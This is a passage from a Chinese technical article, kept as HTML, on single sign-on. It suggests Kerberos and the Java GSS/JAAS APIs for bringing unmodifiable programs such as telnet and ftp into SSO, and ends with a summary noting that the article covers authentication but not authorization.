<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">我们的样例程序（桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">和</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">）都有一个共性：要想将一个应用集成到我们的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">解决方案中，或多或少的需要修改应用程序。</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用需要配置一个我们预制的</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">；桌面应用需要加上我们桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">模块（至少要修改</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">的配置文件）。可是有很多程序是没有源代码和无法修改的，例如常用的远程通讯程序</span><span style="font-size:12pt">telnet</span><span style="font-size:12pt">和</span><span style="font-size:12pt">ftp</span><span style="font-size:12pt">等等一些操作系统自己带的常用的应用程序。这些程序是很难修改加入到我们的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的解决方案中。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">事实上有一种全方位的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">解决方案能够解决这些问题，这就是</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">协议（</span><span style="font-size:12pt">RFC&#13;
 1510</span><span style="font-size:12pt">）。</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">是网络安全应用标准</span><span style="font-size:12pt">(<a target="_blank" href="http://web.mit.edu/kerberos/" style="color:rgb(119,0,0); text-decoration:none">http://web.mit.edu/kerberos/</a>)</span><span style="font-size:12pt">，由</span><span style="font-size:12pt">MIT</span><span style="font-size:12pt">学校发明，被主流的操作系统所采用。在采用</span><span style="font-size:12pt">kerberos</span><span style="font-size:12pt">的平台中，登录和认证是由操作系统本身来维护，认证的凭证也由操作系统来保存，这样整个桌面都可以处于同一个</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的系统保护中。操作系统中的各个应用（如</span><span style="font-size:12pt">ftp,telnet</span><span style="font-size:12pt">）只需要通过配置就能加入到</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">中。另外使用</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">最大的好处在于它的安全性。通过密钥算法的保证和密钥中心的建立，可以做到用户的密码根本不需要在网络中传输，而传输的信息也会十分的安全。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">目前支持</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">的操作系统包括</span><span style="font-size:12pt">Solaris, windows,Linux</span><span style="font-size:12pt">等等主流的平台。只不过要搭建一个</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">的环境比较复杂，</span><span style="font-size:12pt">KDC</span><span style="font-size:12pt">（密钥分发中心）的建立也需要相当的步骤。</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">拥有非常成熟的</span><span style="font-size:12pt">API</span><span style="font-size:12pt">，包括</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">的</span><span style="font-size:12pt">API</span><span style="font-size:12pt">。使用</span><span style="font-size:12pt">Java&#13;
 Generic Security Services(GSS) API</span><span style="font-size:12pt">并且使用</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">中对</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">的支持（详细信息请参见</span><span style="font-size:12pt">Sun</span><span style="font-size:12pt">的</span><span style="font-size:12pt">Java&amp;Kerberos</span><span style="font-size:12pt">教程</span><span style="font-size:12pt">http://java.sun.com/&#13;
 j2se/1.5.0/docs/guide/security/jgss/tutorials/index.html</span><span style="font-size:12pt">），要将我们这个样例改造成对</span><span style="font-size:12pt">Kerberos</span><span style="font-size:12pt">的支持也是不难的。 值得一提的是在</span><span style="font-size:12pt">JDK6.0 </span><span style="font-size:12pt">（</span><span style="font-size:12pt">http://www.java.net/download/jdk6</span><span style="font-size:12pt">）当中直接就包含了对</span><span style="font-size:12pt">GSS</span><span style="font-size:12pt">的支持，不需要单独下载</span><span style="font-size:12pt">GSS</span><span style="font-size:12pt">的包。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">8 </span><span style="font-size:14pt">总结</span></em></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">本文的主要目的是阐述</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的基本原理，并提供了一种实现的方式。通过对源代码的分析来掌握开发</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">服务的技术要点和充分理解</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的应用范围。但是，本文仅仅说明了身份认证的服务，而另外一个和身份认证密不可分的服务</span><span style="font-size:12pt">----</span><span style="font-size:12pt">权限效验，却没有提到。要开发出真正的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的产品，在功能上、性能上和安全上都必须有更加完备的考虑。</span></div>&#13;
<div><span style="font-size:12pt"><br />&#13;
</span></div>&#13;
<span style="font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:13px"></span><br />&#13;
</div>&#13;
   &#13;
